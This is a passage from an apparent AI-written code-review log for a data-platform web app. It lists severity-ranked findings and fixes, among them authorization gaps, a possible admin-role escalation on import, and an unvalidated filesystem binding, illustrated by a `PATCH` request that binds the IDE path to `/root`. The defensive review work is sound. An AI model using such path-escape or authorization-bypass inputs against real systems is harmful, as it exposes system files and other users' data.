- 🟡 use-resolved-dirs.ts:14 — `set-state-in-effect` lint warning (part of the 150 pre-existing). Dead key `versioning.sync_include_data` lingers in both locales after the toggle removal.

Verified sound ✅ (actively probed, no finding):
- **Dead-code removal clean** — grep-confirmed zero dangling imports for every deleted module; grep "hits" for CohortCard/SchemaERD/criteria forms resolve to different, still-present files under other paths; deleted `datasets.py` router not registered in main.py.
- **permissions.py −99 = dead role-rank code only** (`check_*_role`/`require_*_role`/`RESOURCES`/`ACTIONS`, zero refs); permission-based authz intact. **runtime.py/kernel.py** don't weaken sandboxing (deleted run_python/run_r already dead; `ide:execute`+`enable_code_execution` gates intact; terminal session_id → uuid4).
- **Import-match by lineageId/projectId cross-workspace-safe** (all 3 branches guard `workspaceId === currentWs`; `!project.uid` mints fresh uid). **git-links.json sort total order** (type + immutable UUID id). **BASE_PATH injection-safe** (vite base/router basename, never HTML/JS concat); nginx WS map correct.
- **Backend identifier escaping intact** (native-parquet column names via `_quote_ident`; `parquet_schema` via `_sql_str`). **fs_browser browsing service itself careful** (`.expanduser().resolve()` rejects `..`/escapes when roots set; parent-stops-at-root tested) — the flaw is the unvalidated bind, not the browse. Datasets sidebar mark-key parity correct; git-sync-store gen-guards + empty-paths guard intact. No new `any`, no console.log, no unsanitized dangerouslySetInnerHTML, no secrets in touched files.

Carried follow-ups (non-blocking): entity-io.ts split (export/import/clone); box-plot/histogram helper extraction+tests; git-content-retry token hint. Pre-existing/systemic (out of scope): `workspace_id is None → no access check` pattern (planned access-group rework); `update_project` destination-workspace authz on move.

### Fixes applied this review (uncommitted, awaiting user test) — 2026-07-30

All 4 🔴, all 3 🟠, and the 🟡 batch fixed (a prior session applied most; this session finished the loose ends — updated the pre-existing clipboard tests broken by the quoting change, removed the dead i18n key, and added the missing tests for the new pure logic). Verified in source:

**🔴 (all fixed):**
- **FS-bind boundary** (fs_browser.py + api/v1/routes/projects.py) — new `fs_browser.validate_binding_path()` re-enforces the SAME browse-root boundary (`_within_roots` + dir-exists + `enable_code_execution`) at the point of persistence; `update_project` calls it for `ide_path`/`scripts_path`/`datasets_path` from `model_dump(exclude_unset=True)` and returns 400 on rejection. Empty clears the binding (allowed). Client-side picker validation is no longer the only guard, so `PATCH {"ide_path":"/root"}` is refused. Tests: `test_validate_binding_path_*` (roots confinement, empty-clears, code-exec-disabled).
- **`excludedFiles` wired into BOTH builders** (entity-io.ts `buildProjectZip` + project_export.py `build_project_tree` via project_export_assemble.py) — a code file whose export tree path is in `project.config.excludedFiles` is now omitted from the tree AND `scripts/_tree.json` entirely, so the sidebar "unmarked" badge reflects reality. New `excludedCodeFiles()` export (client) + `excluded_files` param (server, read from config in assemble). `defaultSelectedPaths` needs no separate wiring — it diffs the already-built tree, which no longer contains the excluded file. Tests: `test_excluded_code_file_omitted_from_tree` (server), `excludedCodeFiles` describe (client).
- **IDE mark-key double-prefix** (FileTreeItem.tsx `getNodePath`) — the walk now stops AT the synthetic top-level `scripts` container instead of including its name, so a top-level IDE data file keys `scripts/foo.csv` (matches `buildIdePath` on the re-rooted export tree) instead of `scripts/scripts/foo.csv`; the `!path` exception now matches and the marked file is re-included.
- **Docker version drift** (Dockerfile.web) — `COPY VERSION ./VERSION` added before `npm run build` so vite's `readFileSync('../../VERSION')` resolves to the real `2.2.1` instead of throwing → falling back to `0.0.0`; front & back now stamp the same `appVersion` in Docker.

**🟠 (all fixed):**
- **copy-list code quoting** (clipboard-list-format.ts) — a list is emitted bare (unquoted) ONLY when EVERY code is a plain integer (`/^-?\d+$/`, the OMOP concept_id case); otherwise every code is quoted+escaped per language (SQL `''`-doubling; R/Python `"…"` with `\`, `"`, newline escaping), so `IN (E11.9)` / `IN (718-7)` become valid string literals instead of a syntax error / silent subtraction. Newlines in the trailing `concept_name` comment collapsed to spaces. Updated the 4 pre-existing tests (they asserted the old bare-non-numeric behavior; the alignment tests now use plain-integer concept_ids) + 6 new cases (quote/escape/single-item/numeric-vs-string/newline).
- **buildHistogram infinite-loop** (column-stats.ts + ColumnStatsPanel.tsx) — `buildHistogram` bails `[]` on a non-finite bound; the caller's filter is `Number.isFinite` (not `!isNaN`, which passed `Infinity`). Tests added (empty-array stats guard + non-finite bound).
- **.gitignore metacharacter escape** (entity-io.ts `gitignoreEscapePath` + project_export.py `_gitignore_escape`) — both escape `\ [ ] * ? # !` + trailing spaces on the `!path` exception, byte-identically (parity). Tests: `test_gitignore_exception_escapes_metacharacters` (server) + `gitignoreEscapePath` describe (client, cross-checked against the Python cases).

**🟡 batch (all fixed):**
- `computeNumericStats([])` guard (returns zeroed stats, no NaN) + test.
- Dead i18n key `versioning.sync_include_data` removed from both locales (i18n parity still clean).
- New tests pin the mark→`.gitignore`/`!path` escape round-trip and client↔server byte-parity (would have caught 🔴#2/#3 + 🟠#3).
- clipboard newline-in-name strip + single-item/numeric-vs-string coverage (folded into the 🟠 fix above).

**NOT changed (carried, non-blocking):** `dataset-store.ts` `ensureServerMeta` in-flight dedup (harmless, idempotent); `auth-store.ts` 502/503/504→serverUnreachable semantic (no security impact); `use-resolved-dirs.ts` set-state-in-effect (part of the 150 pre-existing React-Compiler warnings); entity-io.ts split; box-plot/histogram helper extraction; git-content-retry token hint.

Verification: frontend **431 tests** pass (+13 vs review baseline of 418) · **0 lint errors** on touched files · typecheck clean · i18n parity clean (0 divergent keys). Backend touched-area **96 pass** (+ new fs_browser/project_export cases) · ruff clean on all touched files. All uncommitted, awaiting the user's app test.

---

## 2026-07-22 — Server-side project+workspace+entity export builders (byte-parity twins) + ms-UTC datetime format + alembic collapse + git-content-status badge/retry + dataset editing (box-plot/categorical filters/stats) + wiki server search + server-mode wasted-work skip

- Reviewed by: Claude Opus 4.8 — 4 parallel adversarial Explore sub-agents by feature group (1: server-side export builders + datetime byte-parity; 2: alembic collapse + git-content-status + git routes/service + dataset backend parsing; 3: dataset editing/dataviz frontend; 4: versioning/import/git-content-retry/wiki/server-mode frontend). **Reviewer independently re-verified every significant finding in source and REPRODUCED the two parity-critical ones empirically:** the float divergence (`json.dumps(100.0)`=`"100.0"` vs `JSON.stringify(100)`=`"100"` for DQ threshold/lastScore) and the datetime ms-UTC parity (`to_iso_ms_z` vs JS `toISOString()` — `.000Z` whole-second, µs truncation, naive→UTC, offset all match). Also independently confirmed: the alembic collapse completeness (all 6 deleted migrations' columns present in `000000000001`, single head, linear chain), the project-retry non-idempotency (`importProjectContent` un-`.catch`'d deterministic-id creates, no delete-first), the git-content-status authz gap (route authorizes path `workspace_id` but service writes client `body.workspace_id`, keyed on `(scope,entity_id)` only), the workspace-child cross-workspace clobber (WorkspacesPage.tsx:482+ delete-then-create with no other-workspace guard), and the hardcoded `'Count'` tooltip (while `datasets.stats_count` exists in both locales).
- Range: 0240b95b..56aafc7c (**32 commits, 196 files, ~7,982 insertions / ~741 deletions**). Highlights: **server-side project + workspace export builders** (`project_export.py`/`_assemble.py` +717, `workspace_export.py`/`_assemble.py` +1162 — Python ports of the TS entity-io builders, offload the browser in fullstack mode) plus **standalone builders for the 6 remaining entity scopes** (data-catalog, dq-rule-set, etl-pipeline, schema-preset, sql-collection, user-plugin), all pinned by twin golden fixtures (TS `*-export-golden.test.ts` + Python `test_*_export*`) against one frozen `expected/`; **ms-UTC datetime format** (`datetime_format.py` `to_iso_ms_z`, `schemas/base.py` `when_used='json'` field-serializer so DB writes still get real datetimes; golden regenerated; `org_snapshot` normalizes inline `createdAt`); **alembic collapse** (all 6 prior migrations → single `000000000001_initial_schema` + new `000000000002_git_content_status`); **git-content-status** (badge + retry for git-linked entities whose content wasn't reconstituted — `git_content_status` model/service/routes, `git-content-retry.ts`, `GitContentStatusBadge`); **git clone token fallback** (retry reuses the stored per-(user,host) token); **dataset editing UX** (`box-plot.tsx`, categorical `ColumnFilterInput`/`use-column-distinct`, `ColumnStatsPanel` +126, type badges, nice histogram ticks); **wiki server-side search** (`wiki_page_service.search_for_workspace`); **server-mode wasted-work skip** (`9447b726` — seed loader skips client row/raw-file work, consumers fall back to server); **import a clean/git project export** (uid stripped — `parseProjectZip` accepts projectId-only, `doImport` mints uid); **workspace git-linked child import fixes** (id collisions, dedup built-in plugin seeding, progress modal); **single VERSION source** (repo-root `VERSION` read by both front & back). Also lands `96eb2a7b` = the prior review's own fixes (spot-checked intact: French-boolean CASE, uid:undefined guard, settings-import admin refusal, matchScore `_js_numbers`).
- Last reviewed commit: 56aafc7cb9aefc0da2a5add9482f6bbc1f0194a9
- Verdict: **Fix-then-ship** — 1 🔴 (DQ float fields `threshold`/`lastScore`/`score` diverge `100.0`↔`100` between server and browser export → guaranteed spurious git diff on a mixed-mode remote; the `_js_numbers` fix landed only in `mapping_project_export`, not the two new builders) + 6 🟠 + a 🟡 batch. **Nothing fixed yet — awaiting user direction.**
- Tests: frontend **376 passed** (37 files) · backend touched-area suites **110 passed** (project/workspace/entity export ×4, mapping-project-export, dataset-parser/rows/files, file-reader, settings-versioning, activity-touch, mapping-projects — via `apps/api/.venv`) · Lint: **0 errors** (pre-existing React-Compiler warnings only) · datetime + float parity reproduced by hand. Alembic: single head, linear, symmetric down.
- Reminder: `apps/api` is **not in the shipping build** (prod = static WASM). BUT 🔴#1 (float parity) affects BOTH modes on a shared remote — a WASM user and a server user versioning the same DQ rule set churn the diff → weighted highest despite being "server-side code". The project-retry 🟠 and both git-content-status authz 🟠 are server-mode-only. The workspace-child clobber 🟠, the 'Count' i18n 🟠, and the BoxPlot NaN 🟠 hit the shipping WASM build.

Findings (all re-verified in source; the two parity ones reproduced empirically):

**🔴 CRITICAL:**
- 🔴 project_export.py:54 (`_json`) + workspace_export.py:56 (`_json`) — **whole-valued float fields serialize as `100.0`/`0.0` (Python) vs `100`/`0` (JS) → perpetual spurious git diff on a mixed-mode remote.** The `_js_numbers` whole-float→int normalizer that the 2026-07-21 review added to `mapping_project_export.py:47` to fix EXACTLY this for `matchScore` was NOT applied to the two new builders (grep: `_js_numbers` appears only in `mapping_project_export.py`). Blast radius = the 3 typed `Float` columns `DqCustomCheck.threshold` (default `0`), `DqRuleSet.last_score`, `DqRunResult.score` — and the frontend defaults thresholds to whole numbers (`DqChecksTab.tsx:192` `threshold:0`; `duckdb/data-quality.ts` `0`/`100`), so a realistic DQ rule set churns on every push. Reproduced live (`json.dumps(100.0)`→`"100.0"` vs `JSON.stringify(100)`→`"100"`). Uncaught: DQ golden fixtures use fractional thresholds (`0.02`/`0.05`) + `lastScore:null`. Fix: extract `_js_numbers` to a shared `app/core/json_export.py` and use it in all three `_json` builders; add a whole-number float (`threshold:0`/`100`, `lastScore:100`) to the DQ golden so the twin tests pin it.

**🟠 IMPORTANT:**
- 🟠 entity-io.ts:1793 (`applyClonedEntity`, `project` branch) — **git-content retry of a git-linked PROJECT is not idempotent → badge stuck "failed" forever (server mode).** The sql/etl/dq branches delete-first (their `decb5b0e`/`2b2d9887` idempotency fix), but the project branch calls `importProjectContent(parsed, targetId)` with no prior `deleteProjectData`. `importProjectContent` uses deterministic ids (`deterministicId(projectUid, oldId)`) and un-`.catch`'d `storage.*.create`, so a retry after a partially-successful first clone re-collides → throws → `retryGitContentClone` catches → re-marks `'failed'`. The project stays permanently half-imported. Fix: `await deleteProjectData(storage, targetId)` before `importProjectContent` (mirror the mapping-project `replaceExisting` treatment).
- 🟠 git.py:1425 (`set_workspace_content_status`) + git_content_status_service.py:15-30 — **content-status PUT trusts the client `body.workspace_id`, not the path-authorized workspace.** Route gates `workspace-settings:write` against the PATH `workspace_id`, but calls `set_status(..., body.workspace_id, ...)` and the row is keyed on `(scope, entity_id)` only → a user with write on workspace A can write/overwrite a badge tagged to workspace B. Bounded (advisory instance state, never exported, no data disclosure). Fix: pass the path `workspace_id`; drop `workspace_id` from `GitContentStatusUpdate`.
- 🟠 git.py:1442 (`clear_workspace_content_status`) + git_content_status_service.py:33-40 — **content-status DELETE clears globally by `(scope, entity_id)`, ignoring the authorized workspace.** Same bounded impact as above; a user with write on A can clear B's badge. Fix: add `GitContentStatus.workspace_id == workspace_id` to the `clear` WHERE + pass the path workspace.
- 🟠 WorkspacesPage.tsx:482-506 (+etl 514, dq 546, mapping 587, catalog 664) — **cross-workspace clobber of a workspace-level child on plain import.** On a non-duplicate import each child keeps its ZIP id then `delete(id)`+`create({id, workspaceId: targetWsId})` with NO cross-workspace guard (unlike the project fix in `ProjectsPage.doImport`) → a child with that id in ANOTHER workspace is silently MOVED into the target. Same clobber class as the prior-review project bug, one level up. Realistic for git-forked children sharing an id. Fix: before delete, if the existing row's `workspaceId !== targetWsId` mint a fresh id (keep lineageId), mirroring the project guard.
- 🟠 ColumnStatsPanel.tsx:422,456 — **hardcoded English `'Count'` in the histogram + date-timeline chart tooltips (i18n regression, shipping build).** Newly added lines; `datasets.stats_count` (`"Count"`/`"Nombre"`) already exists in both locales. A French user sees "Count". Fix: `t('datasets.stats_count')` in both `formatter`s.
- 🟠 box-plot.tsx:26-27,40 — **no NaN/Infinity guard; degenerate input renders invalid SVG (shipping build).** `range = max - min || 1` guards only exact-zero single-value; a `NaN` quartile (server stat absent → `Number(undefined)`, or `ConceptDetailView` free-form parse) makes every `pct()` → `"NaN%"` (blank/garbage), and `max < min` renders negative width. Fed by two callers with untrusted numeric input. Fix: `if (![min,p25,median,p75,max].every(Number.isFinite)) return null` + clamp pct to [0,100].

**🟡 MINOR (batch):**
- 🟡 test_project_export_assemble.py `_normalize_utc` — the regex strips `.\d+Z?`, so this end-to-end test structurally cannot catch a datetime-format regression; only the pure builder test + TS golden pin `…Z`. Add a focused `to_iso_ms_z` unit test (zero-ms→`.000Z`, µs truncation, naive→UTC, offset→UTC).
- 🟡 datetime_format.py:21 (`normalize_iso_ms_z`) vs TS `orgSnapshot` — Python `datetime.fromisoformat` accepts ISO-8601 only and returns non-ISO input verbatim; TS `new Date(...)` is permissive → a non-ISO-but-JS-parseable org `createdAt` diverges. Low (org createdAt is always ISO). Document the assumption.
- 🟡 project_export_assemble.py:206 — attachment dict puts `att.created_at` straight into `_json`, working only because `ReadmeAttachment.created_at` is a `String(40)` column; a future migration to `DateTime` would `TypeError` in plain `json.dumps` and skip `.000Z`. Pin the invariant or route through `to_iso_ms_z`.
- 🟡 git-file-classify.ts:32-58 (`defaultSelectedPaths`) — `isUnownedConfigModification` guards only `modified`; a DELETED `.gitignore`/`.gitattributes` (category `config`, not `other`) is checked by default → proposes to delete a hand-created remote config. In practice Linkr always writes `.gitignore` so it won't appear deleted. Extend the config guard to `deleted` too.
- 🟡 use-column-distinct.ts:28,66 — local-mode distinct effect deps `[fileId, key]` exclude `rows`; a cell edit / row add that leaves the column set unchanged doesn't refresh the categorical filter options (stale until file/column-set changes). Add a `_dirtyVersion` signal to deps for the local branch.
- 🟡 git-content-retry.ts:29 — retry passes no token, relies entirely on the backend stored-token fallback (`625c26eb`); a user with no stored token gets an opaque failure with no way to enter one (the workspace-import dialog has a token input). Surface a hint on auth-gated failure.
- 🟡 ColumnStatsPanel.tsx:394-405 — histogram data/ticks computed in an IIFE in render, not `useMemo` (≤15 bins, low cost). Wrap in `useMemo([stats.histogram])`.
- 🟡 Coverage gaps: `applyColumnFilter` date+boolean branches untested; `toServerFilters` (UI→server filter translation, pure) untested; box-plot quartile/histogram helpers (`percentile`/`buildHistogram` in ColumnStatsPanel) not extracted/tested. File sizes: entity-io.ts 2549 / seed-loader.ts 1299 / WorkspacesPage.tsx 1167 (>800; extraction suggested — entity-io splits naturally into export/import/clone).

Verified sound ✅ (actively probed, no finding):
- **Datetime ms-UTC parity** genuinely correct: `to_iso_ms_z` = JS `toISOString()` for zero-ms (`.000Z`), µs truncation (`.123999`→`.123Z`), naive→UTC, offset→UTC (all reproduced side-by-side). `when_used='json'` guard prevents the DB-write crash (`9c819a90`). `org_snapshot` drops `updatedAt` + normalizes `createdAt`; the workspace-fallback org re-hydrates via `OrganizationResponse.model_dump(mode='json')`. `_slugify`/key-order/`ensure_ascii=False`/separators/no-trailing-newline/code-point sort all match TS. `appVersion` single-sourced from repo-root VERSION, golden-pinned.
- **Alembic collapse complete:** all 6 deleted migrations folded into `000000000001` (localized tab/widget `name`/`description` JSON; user_plugin `organization`/`created_by*`; user `affiliation`/`profession` LocalizedText; `git_credentials` + `uq_git_credential_user_host`, old `git_remote_secret` fully removed; `app_settings`; `version` server_default `0.1.0`). `down_revision=None`, single head, `000000000002` chains + symmetric down.
- **Git injection guards** (`_safe_ref`/`_safe_oid`/`_reject_internal_host`/`_safe_join`) applied on every new argv-feeding path (clone/verify/branches/sync_state/pull_file_bytes, `--` on checkout); synced_oid/branch re-validated even when DB-sourced; schema `_OID_RE`. **Token fallback** resolves only the acting user's own Fernet-encrypted (user,host) token — no leak, no cross-user use, no bypass; never returned (only `has_token`).
- **Wiki server search** filters `workspace_id ==` (bound), matches in Python (no SQL interp), gated `wiki:read` — no injection, no cross-workspace leak.
- **Dataset SQL safety:** frontend categorical filter/stats/distinct pass structured JSON or `encodeURIComponent` params — no frontend SQL. Backend `_infer_types_sql` interpolates only constants + `_quote_ident`-escaped identifiers, categorical filter uses `?` placeholders; **French-boolean fix intact** (`_bool_case` avoids `try_cast AS BOOLEAN`).
- **Server-mode wasted-work skip** does NOT reintroduce the empty-filter bug: seed loader skips row work but `DashboardFilterSidebar`/`GenericConfigPanel`/`DatasetFileTree`/`PluginWidgetRenderer` all fall back to server-side fetches.
- **Dedup built-in plugin seeding** dedups by manifest id via `entityId`, fresh-UUID row ids, skips already-seeded — no drop/duplicate. **git-linked pointer import** always threads `targetWsId` (no `workspaceId:''` orphan). **project-pull** `deleteOverwrittenEntities` deletes analyses/data/raw/files + widgets→tabs→dashboards before insert-only import.
- **Prior review's two 🔴 confirmed fixed:** uid:undefined (`doImport` mints uid on stripped/absent uid) and cross-workspace project clobber (`doImport` mints uid on another-workspace collision). `parseProjectZip` now accepts uid-stripped exports.
- No new `any`, no `console.log`, no unsanitized `dangerouslySetInnerHTML`, no secrets in touched files. All 3 async dataset fetches (distinct/stats/rows) correctly race-guarded (cancelled flag / keyed / monotonic reqId).

Carried follow-ups (non-blocking): the box-plot/histogram quartile helpers want extraction + tests; entity-io.ts split (export/import/clone). Pre-existing/systemic (out of scope): the 4 `data_sources.detail_visit*` EN/FR mismatches (resolved 2026-07-22: dead keys removed); the `workspace_id is None → no access check` pattern.

### Fixes applied this review (uncommitted, awaiting user test) — 2026-07-22

The user approved fixing **all** findings. Applied (verified in source; the 🔴 float parity reproduced before AND after across all three builders):

**🔴 (fixed):**
- **DQ float parity** — extracted `_js_numbers`/`_json` into a shared `app/core/json_export.py` (`js_numbers`/`export_json`) and routed all three builders (`project_export`, `workspace_export`, `mapping_project_export`) through it, so a whole-valued float (DQ `threshold`/`lastScore`/`score` of 0/100, a `matchScore` of 1.0) serializes as `0`/`100`/`1` like `JSON.stringify` instead of `0.0`/`100.0`/`1.0`. Removed the now-duplicate `_js_numbers` + `import json` from each builder. Pinned by the DQ golden: set `lastScore: 100` + one check `threshold: 100` in the shared `dq-rule-set` fixture (input + expected/rule-set.json + expected/checks.json) so the TS twin AND the Python `build_dq_rule_set_tree`/`test_entity_export_assemble` both assert the int form. Verified: all three `_json`s emit `100`/`0`/`0.05` (not `100.0`/`0.0`).

**🟠 (all fixed):**
- **project git-content retry idempotency** (entity-io.ts) — the `project` branch of `applyClonedEntity` now `await deleteProjectData(storage, targetId)` before `importProjectContent`, mirroring the delete-first sql/etl/dq branches, so a retry after a partial clone no longer collides on deterministic ids and re-marks 'failed'. (`deleteProjectData` covers ide/connections/attachments/datasets+data+raw+analyses/dashboards+tabs+widgets — everything the import creates.)
- **git-content-status authz** (git.py + git_content_status_service.py + schemas/git.py) — the PUT now uses the PATH `workspace_id` (dropped `workspace_id` from `GitContentStatusUpdate` + the client body); `set_status` refuses to overwrite/reparent a row tagged to a different workspace (entity ids are globally unique → a row belongs to one workspace), and `clear` is scoped to the authorized workspace. New `test_git_content_status_service.py` (workspace-scoped list, can't-overwrite-another-workspace, updates-own-row, clear-only-own). NOTE surfaced by the test: the table has `UniqueConstraint(scope, entity_id)` (no workspace), confirming the globally-unique-entity_id assumption — the fix respects it (guard, not workspace-partitioned upsert).
- **workspace-child cross-workspace clobber** (WorkspacesPage.tsx) — new `resolveChildId(getById, originalId)` helper: a plain import keeps the ZIP id (git round-trip overwrite) EXCEPT when that id already belongs to a child in ANOTHER workspace, where it mints a fresh id (mirrors ProjectsPage.doImport). Applied to all 7 child branches (sql/etl/dq/conceptSets/mapping/catalog/serviceMappings); the delete-then-create now guards on `id === originalId`, and child files/checks/mappings remint when the parent id was re-minted (`remint = id !== originalId`, covers both duplicate and collision).
- **hardcoded 'Count'** (ColumnStatsPanel.tsx) — both chart tooltips now `t('datasets.stats_count')` (key already in both locales).
- **BoxPlot NaN guard** (box-plot.tsx) — bails (`return null`) when any of min/p25/median/p75/max is non-finite; `pct`/IQR-width clamped to [0,100] (guards a `max < min` negative width).

**🟡 batch (all fixed except the retry-token hint, carried):**
- datetime unit test — new `test_datetime_format.py` pins `to_iso_ms_z`/`normalize_iso_ms_z` (zero-ms→`.000Z`, µs truncation, naive→UTC, offset→UTC, plain-date/Zulu/garbage) independently of the goldens (whose assemble test normalizes `.SSSZ` away).
- attachment createdAt invariant (project_export_assemble.py) — routed through `to_iso_ms_z`/`normalize_iso_ms_z` so a future String→DateTime migration can't emit a raw datetime or a divergent format.
- org_snapshot ISO assumption (org_snapshot.py) — documented that `normalize_iso_ms_z` only rewrites ISO strings (non-ISO would diverge from TS `new Date`).
- deleted-config guard (git-file-classify.ts) — a DELETED `.gitignore`/`.gitattributes` is no longer checked by default (new `isConfigFile` guard in `defaultSelectedPaths`); test added.
- local distinct staleness (use-column-distinct.ts + DatasetTable.tsx) — new optional `dataVersion` param (wired to `_dirtyVersion`) in the effect deps so a cell edit refreshes categorical filter options in front-only mode.
- test coverage — `applyColumnFilter` date+boolean cases added; `toServerFilters` exported + tested (categorical→values, empty-skip, number/date/string by type, null drop). column-filter.test.ts 5→15 tests.

**NOT changed (carried):** the git-content-retry opaque-failure token hint (git-content-retry.ts:29 — minor UX, belongs in the badge component, out of proportion to fix now); box-plot/histogram quartile helper extraction+tests; entity-io.ts split.

Verification: frontend **384 tests** pass (+8) + **0 lint errors** (153 pre-existing React-Compiler warnings) + typecheck clean on all touched files; backend touched-area suites **110 pass** + ruff clean on all touched files. All uncommitted, awaiting the user's app test.

---

## 2026-07-21 — Server-side mapping-project export (byte-parity Python twin) + git per-user/host tokens + settings-versioning (orgs/users/roles) + project git-pull + versioning quick-actions + SQL-scripts/IDE homogenize + dataset server-preview

- Reviewed by: Claude Opus 4.8 — 4 adversarial Explore sub-agents by feature group (BE git+settings-versioning; BE server-export+dataset-parser+source-concept-id-scope; FE versioning+project-pull+quick-actions; FE settings/users/SQL/Header — the last one relaunched split in two, 4a UI + 4b pure IO, after the first attempt died without a result). **Reviewer independently re-verified EVERY reported finding in source, and REPRODUCED the two most severe empirically:** the French-boolean data loss (`try_cast('oui' AS BOOLEAN)` → NULL in a live DuckDB, while inference classifies it boolean), and the matchScore float-parity (`json.dumps(1.0)`=`"1.0"` vs `JSON.stringify(1.0)`=`"1"`). Also independently confirmed: the projectId-only import `uid: undefined` chain (traced through ProjectsPage doImport), the datasetAnalyses overwrite ConstraintError (`db.add` + deterministic `mapId`), the 3 missing `file_cat_*` i18n keys (rendered raw at GitDiffDialog:86/GitSyncPanel:338), the imported-`admin`-role escalation, the clone-retry `workspaceId:''` orphan, the alembic chain (linear, single head `a7b8c9d0e1f2`, 4 new migrations up/down-symmetric), and the byte-parity golden fixture (twin TS+Python producers against one frozen `expected/`).
- Range: 0b6e5748..0240b95b (**80 commits, 206 files, ~12,588 insertions / ~1,904 deletions**). Highlights: **server-side mapping-project export** (`mapping_project_export.py`/`_assemble.py` — byte-faithful Python port of the TS git-variant builder, pinned by a shared golden fixture + twin tests; offloads the browser); **source-concept-id ownership rework** (entries per project scoped to its (vocab,code) universe, ranges at root, merged/reconciled on import/seed — `source_concept_id_scope.py`); **git credential re-architecture** (per (user, host) token, Fernet-encrypted, never returned — replaces per-entity secret); **settings-versioning** (push/import organizations+users+roles, NO passwords — `settings_import_service.py`/`_export_assemble.py`, `app_settings` singleton, all admin-gated); **project git-pull** (additive overlay — `project-pull.ts`, `ProjectPullDialog`); **versioning quick-actions** (Sync all / per-group, include-data toggle, A/M/D badges, per-action spinner, click-file→diff — `git-quick-actions.ts`, `GitSyncPanel` +396); **users** (rich datatable, block self-disable/delete, block enabling a password-less local account); **SQL-scripts** homogenized with the IDE (file tree, Markdown-on-run, run-selection shortcut); **dataset server-side preview** (preview == import via `dataset_parser.py`); **activity_touch** (bubble child-write to parent updatedAt); Header entity-badge ordering + type-name-to-confirm delete; Docker rocker/r-ver pinned 4.5.1.
- Last reviewed commit: 0240b95b4905b7d71be60431623db3012d150bfb
- Verdict: **Fix-then-ship** — 2 🔴 (French-boolean columns imported all-NULL, preview≠import, server-mode; clean-export re-import via Projects page → `uid: undefined`, shipping build) + 6 🟠 + a 🟡 batch. **User approved fixing ALL findings; applied this review (uncommitted, awaiting app test) — except entries.json parity, which was investigated and deliberately DEFERRED (a faithful TS port needs the DuckDB-deduped dictionary; a hand-rolled scope would be a third divergent behaviour — see the applied-fixes note).**
- Tests: frontend **354 passed** (28 files) · backend touched-area suites **82 passed** (git-credential, settings-versioning, git-settings-routes, mapping-project-export ×2, source-concept-id-scope, activity-touch, dataset-parser, git-routes, versioning-dir-cleanup, users — via `apps/api/.venv`) · Lint: **0 errors** (152 pre-existing React-Compiler warnings) · Typecheck: **0 errors** · i18n parity: clean (only the 4 pre-existing `data_sources.detail_visit*` — resolved 2026-07-22: dead keys removed). Alembic: linear, single head, 4 new migrations up/down-symmetric.
- Reminder: `apps/api` is **not in the shipping build** (prod = static WASM). 🔴#1 (French-boolean), the settings-import 🟠, the matchScore/entries parity 🟠, the content-disposition 🟠, and the transcode-tmp 🟡 are server-mode-only. **🔴#2 (uid:undefined) and the datasetAnalyses-overwrite 🟠 hit the shipping WASM build** → weighted highest.

Findings (all re-verified in source; the two 🔴 reproduced empirically):

**🔴 CRITICAL:**
- 🔴 dataset_rows.py:62 (`_typed_projection`) + type_inference.py:17-18 — **French boolean columns imported as all-NULL (preview ≠ import, silent data loss), server mode.** Inference classifies `oui/non/vrai/faux/o` as `boolean` (BOOL_TRUE/BOOL_FALSE incl. FR tokens, and the row-by-row `parse_boolean` preview renders them correctly), but the Parquet write casts with `try_cast(x AS BOOLEAN)` — DuckDB returns **NULL** for exactly those FR tokens (reproduced live: `oui/non/vrai/faux/o → NULL`; `yes/no/true/1 → ok`). So the dialog shows True/False and the imported column is empty — the precise invariant this "preview == import" feature exists to guarantee. Uncaught: tests use `yes/no`; no test round-trips `oui/non` through `write_parquet`. (The client `dataset-utils.ts` shares the same FR token set — worth checking its typed-write path, though that isn't in this diff.) Fix: emit an explicit `CASE WHEN lower(trim(x)) IN (<true-tokens>) THEN true WHEN … THEN false ELSE NULL END` in `_typed_projection` (mirror `parse_boolean`), or restrict boolean inference to DuckDB-castable tokens.
- 🔴 ProjectsPage.tsx:193-194 (`doImport`) — **clean/git project export re-imported via the Projects page → `uid: undefined` (store corruption), shipping build.** `buildProjectZip` now strips `uid` from project.json (entity-io.ts:474); `parseProjectZip` accepts projectId-only. On a **plain** import, `globalExisting = find(p => p.uid === undefined)` and `uid = … ? randomUUID() : project.uid` → `uid = undefined` → `deleteProjectData(undefined)`, `projects.delete(undefined)`, `projects.create({uid: undefined})`, `importProjectContent(parsed, undefined)`. Server mode likely 500s the insert; IDB keys a record `undefined` and collides on the next such import. The duplicate path (fresh UUID) and the git-pull path (caller supplies projectUid) are safe; only the file-import path is broken. Mapping projects are unaffected (keyed on `id`, not stripped). Uncaught: the projectId-only test asserts parse-only, never runs doImport. Fix: `uid = … ? randomUUID() : (project.uid ?? randomUUID())` (keep the cross-workspace-collision guard).

**🟠 IMPORTANT:**
- 🟠 settings_import_service.py:158-186 — **settings import can create/promote an `admin` user, no visibility in the pull-preview.** `if role not in role_names and role != "admin"` always accepts `role:"admin"`. On a NEW user it lands disabled+passwordless (latent admin, must be enabled later); on an EXISTING active user it sets `existing.role="admin"` with password/is_active untouched → **immediate silent promotion**, bypassing the `user_service.update` guards (that path isn't traversed). Admin-gated to trigger, and the pull-preview shows only counts. Fix: drop imported `admin` → `user` with a warning, or surface admin-granting rows explicitly in the preview + warnings.
- 🟠 project-pull.ts:334-342 (`deleteOverwrittenEntities`) — **pull-overwrite of a dataset leaves `datasetAnalyses` undeleted → ConstraintError, half-deleted dataset, shipping build.** The datasets branch deletes datasetData/datasetRawFiles/datasetFiles but not datasetAnalyses; re-import creates analyses at a deterministic id (`mapId` = `deterministicId(projectUid, oldId)`) via `db.add` (idb-storage.ts:1336), which throws on the duplicate. With no transaction, the file/data are already gone → local data loss. The full-import cleanup deletes analyses first (entity-io.ts:117); this selective path omits it. Fix: add `await storage.datasetAnalyses.deleteByDataset(f.id).catch(()=>{})` before the datasetFiles.delete.
- 🟠 git-file-meta.ts:140-142 → GitDiffDialog.tsx:86 + GitSyncPanel.tsx:338 — **3 missing i18n keys render raw.** Categories `organizations`/`users`/`roles` (settings scope) have no `versioning.file_cat_*` key in en.json OR fr.json (every other file_cat key is present in both) → the Settings › Versioning file-list + diff headers show the literal `versioning.file_cat_organizations`. Fix: add `file_cat_organizations`/`_users`/`_roles` to both locales.
